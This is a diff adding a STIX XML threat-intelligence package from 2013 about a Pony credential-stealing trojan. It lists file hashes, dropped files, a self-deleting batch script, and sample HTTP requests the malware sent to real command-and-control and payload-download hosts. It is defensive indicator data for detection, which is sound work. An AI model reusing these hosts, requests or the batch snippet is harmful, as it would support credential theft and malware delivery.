@@ -1,0 +1,317 @@
+<stix:STIX_Package xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2" xmlns:indicator="http://stix.mitre.org/Indicator-2" xmlns:cyboxCommon="http://cybox.mitre.org/common-2" xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2" xmlns:stixCommon="http://stix.mitre.org/common-1" xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2" xmlns:marking="http://data-marking.mitre.org/Marking-1" xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1" xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1" xmlns:cybox="http://cybox.mitre.org/cybox-2" xmlns:stix="http://stix.mitre.org/stix-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:CISCP="http://www.us-cert.gov/ciscp" id="CISCP:IB-13-10533" version="1.1.1" xsi:schemaLocation="http://cybox.mitre.org/objects#DomainNameObject-1 http://cybox.mitre.org/XMLSchema/objects/Domain_Name/1.0/Domain_Name_Object.xsd http://cybox.mitre.org/objects#PortObject-2 http://cybox.mitre.org/XMLSchema/objects/Port/2.1/Port_Object.xsd http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd http://cybox.mitre.org/objects#WinRegistryKeyObject-2 http://cybox.mitre.org/XMLSchema/objects/Win_Registry_Key/2.1/Win_Registry_Key_Object.xsd http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd http://cybox.mitre.org/objects#SocketAddressObject-1 http://cybox.mitre.org/XMLSchema/objects/Socket_Address/1.1/Socket_Address_Object.xsd http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd http://cybox.mitre.org/objects#LinkObject-1 http://cybox.mitre.org/XMLSchema/objects/Link/1.1/Link_Object.xsd http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd http://cybox.mitre.org/objects#EmailMessageObject-2 http://cybox.mitre.org/XMLSchema/objects/Email_Message/2.1/Email_Message_Object.xsd http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1 http://stix.mitre.org/XMLSchema/extensions/marking/simple/1.1.1/simple_marking.xsd http://cybox.mitre.org/objects#MutexObject-2 http://cybox.mitre.org/XMLSchema/objects/Mutex/2.1/Mutex_Object.xsd http://cybox.mitre.org/objects#NetworkConnectionObject-2 http://cybox.mitre.org/XMLSchema/objects/Network_Connection/2.1/Network_Connection_Object.xsd http://us-cert.gov/ciscp http://www.us-cert.gov/sites/default/files/STIX_Namespace/ciscp_vocab_v1.1.1.xsd http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd">
+  <stix:STIX_Header>
+    <stix:Title>File is identified as info stealing Trojan</stix:Title>
+    <stix:Package_Intent xsi:type="stixVocabs:PackageIntentVocab-1.0">Indicators</stix:Package_Intent>
+    <stix:Description>On 31 JULY 2013, a file was submitted for analysis from a third party. The file is a PWS.Win32 trojan which is capable of stealing information from the victim machine. The malware dropped four files in the %TEMP% directory and made attempts to communicate with five command and control(C2) servers.
+
+This document incorporates data originally released as US-CERT MIFR-302125.</stix:Description>
+    <stix:Handling>
+      <marking:Marking>
+        <marking:Controlled_Structure>//node()</marking:Controlled_Structure>
+        <marking:Marking_Structure color="GREEN" xsi:type="tlpMarking:TLPMarkingStructureType"/>
+      </marking:Marking>
+    </stix:Handling>
+    <stix:Information_Source>
+      <stixCommon:Time>
+        <cyboxCommon:Produced_Time>2013-08-29T17:26:12Z</cyboxCommon:Produced_Time>
+      </stixCommon:Time>
+    </stix:Information_Source>
+  </stix:STIX_Header>
+  <stix:Indicators>
+    <stix:Indicator id="CISCP:indicator-7bc39416-22bc-440f-9f80-2a7e95e8a14c" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Composite_Indicator_Expression operator="OR">
+        <indicator:Indicator idref="CISCP:indicator-786db67a-d5b7-46ff-92b5-5e062bb7d234"/>
+        <indicator:Indicator idref="CISCP:indicator-9cc5d77f-2b92-4842-a341-3ab5637079f5"/>
+        <indicator:Indicator idref="CISCP:indicator-98de337c-76b9-4954-9ed6-b7bb6f681efc"/>
+        <indicator:Indicator idref="CISCP:indicator-4175a27d-af84-4148-ba21-dd39cd6fdf2c"/>
+        <indicator:Indicator idref="CISCP:indicator-ebc6c2d6-0258-41c7-9e6f-16fe38e413e4"/>
+        <indicator:Indicator idref="CISCP:indicator-f3e2a231-e5fe-4ef4-bc92-89659746cdf9"/>
+        <indicator:Indicator idref="CISCP:indicator-7fc23d14-8278-466b-8bd0-3409b227eabc"/>
+        <indicator:Indicator idref="CISCP:indicator-849d61b3-846f-4b6f-92d1-6e50d974dbba"/>
+      </indicator:Composite_Indicator_Expression>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-786db67a-d5b7-46ff-92b5-5e062bb7d234" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>This malware is custom packed.  The file name has 8 random digits appeneded to the end. Only two imported DLLs are apparent, "KERNEL32.dll" and "CERTCLI.dll", when viewed using static analysis.
+The interesting APIs are:
+Library KERNEL32.dll
+ *WaitForMultipleObjects
+ *OpenMutexA
+ *CreateDirectoryW
+ *GetFileAttributesA
+
+Library CERTCLI.dll
+ *CADeleteCertType
+ *CADeleteCA
+ *CAEnumCertTypes
+ *CAEnumFirstCA
+
+Performing dynamic analysis, the first step that the malware does is to inject its code into "explorer.exe".
+
+Once the above process finishes executing, the malware made several modifications to the Windows registry and file system. (Note: The extent of the file and registry modifications depends on the applications configured on the system).
+
+There are numerous APIs that will be used by the malware to monitor incoming and outgoing connections. They also indicate that the malware has the capability to steal stored account information and credentials used in applications such as File Transfer Protocol (FTP), email, and Internet browsers. The malware gathers directory lists, passwords, port numbers, server names, user names, and browser certificates by retrieving addresses of Windows APIs, checks if WOW64 is running, obtains volume GUID path, generates a CLSID from the GUID and then collects the information it needs.
+
+The malware made attempts to send HTTP GET requests to the following remote sites:
+ http://magic&#8208;crystal.ch/0ijiK8Y.exe
+ http://chartomresidence.com/j7qtsL.exe
+ http://ftp.petrasolutions.com/REXLa9.exe
+
+In addition, the malware made attempts to send HTTP POST requests to the following remote sites:
+ http[:]//50.57.185.72:8080/ponyb/gate.php
+ http[:]//deltaoutriggercafe.com/ponyb/gate.php</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-29adc3f7-6435-4a23-a215-967d98e26d8c">
+        <cybox:Object id="CISCP:Object-4bb60120-65fd-4d39-8c61-437fb6bb104b">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">Bendigo_Report_#{DIGIT[8]}.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">118784</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">c645df9f57e6b7122b8b61ef63abd431</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">6f18f0afcb25de6c2d8c112cee35ff0a564e9109</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">b2f7674e03f50455a59e62d3eb494e3b977f753431822fc7004cff899353fdb4</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-07-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-9cc5d77f-2b92-4842-a341-3ab5637079f5" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>This is one of three executables (.exe) dropped by the malware.  The file names are randomly generated. Analysis of the executable files was not performed because custom packing prevented the files from being read.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-5e810838-6304-4d1b-8026-cdbe242ebaea">
+        <cybox:Object id="CISCP:Object-2ef540e9-0bc1-44ca-b335-68a0046a389d">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">5105000.exe</FileObj:File_Name>
+            <FileObj:File_Path condition="Equals">%USERPROFILE%/Local Settings/Temp/</FileObj:File_Path>
+            <FileObj:Size_In_Bytes condition="Equals">32768</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">c18e3725c94658acbc61eaae5a741c65</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">6fbd623ccef259ea65750d08f8511758d01816d6</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">9a270017dd339531fffc6abb0fb77506b2bf973f4676fc191233470cf902a4a6</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">384:wakPUrDMm+ij7q0sjxhsLASImSZX3X47JtkGYpvEDHsb0nuXT1GPf7cZR6j9d:oUrY6K0sFheBlqHo7U/xEDMAnAMcqj9</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-07-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-98de337c-76b9-4954-9ed6-b7bb6f681efc" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>The file "Bendigo_Report_#DIGIT[8]}.exe" drops this batch file in the %USERPROFILE%/Local Settings/TEMP directory. The file name is randomly generated.
+
+The purpose of the batch file is to delete the original loader file after execution. The [random_numbers].bat syntax is:
+\r\n\t\t\r\n\r\n\t :ktk \r\n\r\n\r\n del \t %1 \r\n\tif \t\t exist \t %1 \t goto \t\r ktk\r\n del \t %0
+
+The malware creates a process in memory, "cmd.exe" which will delete the batch file.
+
+This same file was untilized in spear phishing campaign outlined in IB-13-10332.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-db43e841-e124-4440-8c77-45b6dc2f0e6c">
+        <cybox:Object id="CISCP:Object-61d9908d-1e7c-49bf-9cfe-98d4880af6fb">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">7677453.bat</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">94</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">3880eeb1c736d853eb13b44898b718ab</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">4eec9d50360cd815211e3c4e6bdd08271b6ec8e6</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">936d9411d5226b7c5a150ecaf422987590a8870c8e095e1caa072273041a86e7</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">3:k4Zoa5/kFWJFFN6dAFZkMFlGl/AVFn:k/0/kFY/NDFZotwFn</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-07-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-4175a27d-af84-4148-ba21-dd39cd6fdf2c" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>URLs including the URL path "ponyb/gate.php" have been previously reported in the following products: IB-13-10332, IB-13-10302, IB-13-10260, IB-13-10258, IB-13-10206, IB-13-10205, CIB-20130304-01, and CIB-20130227-01.
+
+Below is a sample of the HTTP POST request made by the malware.
+
+POST /ponyb/gate.php HTTP/1.0
+Host: 50.57.185.72
+Accept: */*
+Accept&#8208;Encoding: identity, *;q=0
+Accept&#8208;Language: en&#8208;US
+Content&#8208;Length: 271
+Content&#8208;Type: application/octet&#8208;stream
+Connection: close
+Content&#8208;Encoding: binary
+User&#8208;Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-4f6ade89-ead9-4085-b3b8-6b29c88444a8">
+        <cybox:Object id="CISCP:Object-b36f203b-985f-472a-ae3a-6a7a5f49816d">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://50.57.185.72:8080/ponyb/gate.php</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-07-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-ebc6c2d6-0258-41c7-9e6f-16fe38e413e4" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>Below is a sample HTTP POST request made by the malware.
+
+POST /ponyb/gate.php HTTP/1.0
+Host: deltaoutriggercafe.com
+Accept: */*
+Accept&#8208;Encoding: identity, *;q=0
+Accept&#8208;Language: en&#8208;US
+Content&#8208;Length: 271
+Content&#8208;Type: application/octet&#8208;stream
+Connection: close
+Content&#8208;Encoding: binary
+User&#8208;Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-a0401e64-882e-4189-bab7-a95d7dcc6167">
+        <cybox:Object id="CISCP:Object-e893ad39-9a61-49a7-8ee6-cd96a2bb7cac">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://deltaoutriggercafe.com:80/ponyb/gate.php</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-07-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-f3e2a231-e5fe-4ef4-bc92-89659746cdf9" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>Below is a sample HTTP GET request made by the malware.
+
+GET /0ijiK8Y.exe HTTP/1.0
+Host: magic-crystal.ch
+Accept&#8208;Language: en&#8208;US
+Accept: */*
+Accept&#8208;Encoding: identity, *;q=0
+Connection: close
+User&#8208;Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-57730647-b2dc-4fae-8771-999d17ea8bec">
+        <cybox:Object id="CISCP:Object-81a368e4-e23b-401f-988a-89b098bbdbcd">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://magic-crystal.ch:80/0ijiK8Y.exe</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-07-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-7fc23d14-8278-466b-8bd0-3409b227eabc" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>GET /j7qtsL.exe HTTP/1.0
+Host: chartomresidence.com
+Accept&#8208;Language: en&#8208;US
+Accept: */*
+Accept&#8208;Encoding: identity, *;q=0
+Connection: close
+User&#8208;Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-7201e90a-4f30-4d80-9caf-bd1f6cf087c7">
+        <cybox:Object id="CISCP:Object-4b290c12-4342-452c-809e-09370f243cc7">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://chartomresidence.com:80/j7qtsL.exe</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-07-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-849d61b3-846f-4b6f-92d1-6e50d974dbba" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>Below is a sample HTTP GET request made by the malware.
+
+GET /REXLa9.exe HTTP/1.0
+Host: ftp.petrasolutions.com
+Accept&#8208;Language: en&#8208;US
+Accept: */*
+Accept&#8208;Encoding: identity, *;q=0
+Connection: close
+User&#8208;Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-cad3d50e-a518-43b5-a847-b61841c11349">
+        <cybox:Object id="CISCP:Object-7b884113-b23d-4473-be11-84d4916b492e">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://ftp.petrasolutions.com:80/REXLa9.exe</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-07-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+  </stix:Indicators>
+  <stix:TTPs>
+    <stix:Kill_Chains>
+      <stixCommon:Kill_Chain definer="LMCO" id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="LM Cyber Kill Chain" number_of_phases="7" reference="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf">
+        <stixCommon:Kill_Chain_Phase name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/>
+        <stixCommon:Kill_Chain_Phase name="Weaponization" ordinality="2" phase_id="stix:KillChainPhase-445b4827-3cca-42bd-8421-f2e947133c16"/>
+        <stixCommon:Kill_Chain_Phase name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+        <stixCommon:Kill_Chain_Phase name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/>
+        <stixCommon:Kill_Chain_Phase name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+        <stixCommon:Kill_Chain_Phase name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+        <stixCommon:Kill_Chain_Phase name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/>
+      </stixCommon:Kill_Chain>
+    </stix:Kill_Chains>
+  </stix:TTPs>
+</stix:STIX_Package>
